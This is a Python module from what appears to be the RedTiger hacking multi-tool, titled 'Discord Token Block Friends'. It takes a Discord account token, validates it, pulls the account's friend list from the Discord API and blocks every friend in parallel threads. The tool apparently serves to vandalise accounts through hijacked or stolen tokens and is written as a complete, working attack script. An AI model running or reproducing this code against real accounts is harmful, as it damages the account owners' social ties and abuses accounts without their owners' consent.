# Copyright (c) RedTiger 
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *
try:
    import requests
    import threading
except Exception as e:
   ErrorModule(e)
   
Title("Discord Token Block Friends")

try:
    Slow(discord_banner)
    token = Choice1TokenDiscord()
    r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
    if r.status_code == 200:
        pass
    else:
        ErrorToken()

    def BlockFriends(token, friends):
        for friend in friends:
            try:
                requests.put(f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers={'Authorization': token}, json={"type": 2})
                print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Status: {white}Blocked{red} | User: {white}{friend['user']['username']}#{friend['user']['discriminator']}")
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Status: {white}Error: {e}{red}")

    friend_id = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={'Authorization': token}).json()
    if not friend_id:
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} No friends found.")
        Continue()
        Reset()

    processes = []
    for friend in [friend_id[i:i+3] for i in range(0, len(friend_id), 3)]:
        t = threading.Thread(target=BlockFriends, args=(token, friend))
        t.start()
        processes.append(t)
    for process in processes:
        process.join()
    Continue()
    Reset()
except Exception as e:
    Error(e)